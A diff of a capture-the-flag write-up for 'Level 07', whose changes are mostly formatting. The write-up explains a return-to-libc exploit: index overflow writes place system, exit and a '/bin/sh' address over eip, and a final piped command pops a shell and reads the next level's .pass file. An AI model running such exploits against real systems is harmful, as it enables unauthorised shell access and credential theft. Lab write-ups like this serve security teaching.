@@ -1,17 +1,16 @@
 # Level 07
 
-## the stack
+## The Stack
 
 ![The stack](resources/the_stack_override07.jpg)
 
-## the method
+## The Method
 
-We have a way to overwrite the memory.
+- We have a way to overwrite the memory.
+- Let's try to overwrite `eip`.
+- No shellcode because `env` is set to 0 at beggining.
 
-let's try to overwrite eip
-
-no shellcode because env is set to 0 at begging
-
+```gdb
 (gdb) p/c 1073741938
 $1 = 114 'r'
 (gdb) p/c 1073741939
@@ -30,8 +29,9 @@ $2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
 1073741938 => 4159090384 (0xf7e6aed0)
 1073741939 => 4159040368 (0xf7e5eb70)
 116 => 4160264172 (0xf7f897ec)
+```
 
-```sh
+```console
 $ ./level07
 ----------------------------------------------------
   Welcome to wil's crappy number storage service!
@@ -62,11 +62,11 @@ level08
 $ cat /home/users/level08/.pass
 ```
 
-## the hack
+## The Hack
 
-final command:
+- Final command:
 
-```sh
+```console
 $ (echo store; echo 4159090384; echo 1073741938 ; echo store; echo 4159040368; echo 1073741939 ; echo store; echo 4160264172; echo 116 ; echo quit; cat) | ./level07
 ----------------------------------------------------
   Welcome to wil's crappy number storage service!
